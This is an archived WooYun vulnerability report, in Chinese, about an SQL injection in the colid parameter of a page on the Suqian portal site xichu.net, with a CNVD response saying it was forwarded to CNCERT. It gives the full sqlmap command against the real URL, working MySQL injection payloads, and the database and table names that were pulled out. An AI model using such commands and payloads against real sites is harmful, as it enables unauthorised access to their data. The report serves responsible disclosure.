wybug_title: 宿迁最大综合门户网站SQL注入一枚
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2015-01-04：	细节已通知厂商并且等待厂商处理中									2015-01-09：	厂商已经确认，细节仅向厂商公开									2015-01-19：	细节向核心白帽子及相关领域专家公开									2015-01-29：	细节向普通白帽子公开									2015-02-08：	细节向实习白帽子公开									2015-02-18：	细节向公众公开  简要描述： 无意间看到一个sql注入漏洞，貌似蛮严重的。 详细说明：  sqlmap -u "http://www.xichu.net/edu/count/col_stat.php?colid=44" --dbs --batch -v3---Place: GETParameter: colid    Type: boolean-based blind    Title: MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)    Payload: colid=44' RLIKE (SELECT (CASE WHEN (5479=5479) THEN 44 ELSE 0x28 END)) AND 'BTzD'='BTzD    Vector: RLIKE (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE 0x28 END))    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: colid=44' AND (SELECT 7757 FROM(SELECT COUNT(*),CONCAT(0x7171616571,(SELECT (CASE WHEN (7757=7757) THEN 1 ELSE 0 END)),0x716f727971,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'zCKO'='zCKO    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: colid=44' AND SLEEP(5) AND 'SSmB'='SSmB    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])---available databases [14]:[*] corp_xichu_www[*] hello[*] information_schema[*] livechat-db-template[*] mysql[*] net_xichu_www-------------------------当前[*] passport[*] phpadnew[*] shinyv_product_sqdst[*] shinyv_product_vblog_sq[*] shinyv_statistics_1_1_dev[*] sky[*] sso_080519[*] xichubbsDatabase: net_xichu_www[87 tables]+------------------------------+| liv_apply_history            || liv_apply_relate             || liv_apply_relate_20081119    || liv_article                  || liv_article_contentbody      || liv_autorecord               || liv_banword                  || liv_baojia_car               || liv_bid liv_cell_back_20080827       || liv_cell_mode                || liv_cell_type                || liv_client_side              || liv_cmssetting               || liv_cmssettinggroup          || liv_column                   || liv_column_stat              || liv_column_stat_result       || liv_column_template          || liv_comment                  || liv_content_grade            || liv_content_hits             || liv_content_material         || liv_contentmap               || liv_contentmode              || liv_datasource               || liv_datasource_fields        || liv_datasource_modeassociate || liv_dictionary               || liv_event                    || liv_execution                || liv_execution_relate         || liv_fc                       || liv_feed 然后还登录上去了。。。当然点到为止。。。。不继续深入。。。希望站长尽快修复。。。。各种跨库。。。。啊呜。。。。   漏洞证明：  上面说了。。。点到为止。。。不做深入。。。   修复方案：  啊呜。。。。   版权声明：转载请注明来源 流星warden@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：9  确认时间：2015-01-09 13:45 厂商回复： CNVD确认所述情况，已经转由CNCERT下发给江苏分中心，由其后续协调网站管理单位处置。 最新状态： 暂无
